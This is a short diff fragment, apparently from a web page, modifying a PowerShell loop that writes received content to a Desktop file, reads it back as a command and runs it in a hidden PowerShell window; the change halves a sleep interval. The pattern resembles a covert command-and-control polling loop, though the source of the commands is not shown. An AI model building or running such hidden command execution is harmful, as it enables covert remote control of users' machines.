@@ -162,7 +162,7 @@ if ($signal -eq "True") {<br>
 Set-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" -Value $contents<br>
 $cmd = Get-Content -Path "C:\Users\$env:USERNAME\Desktop\ImportantStuff\contents.txt" <br>
 Start-Process -FilePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -ArgumentList $cmd -WindowStyle Hidden<br>
-  Start-Sleep -Seconds 600<br>
+  Start-Sleep -Seconds 300<br>
 }<br>
 }<br>
 </p>
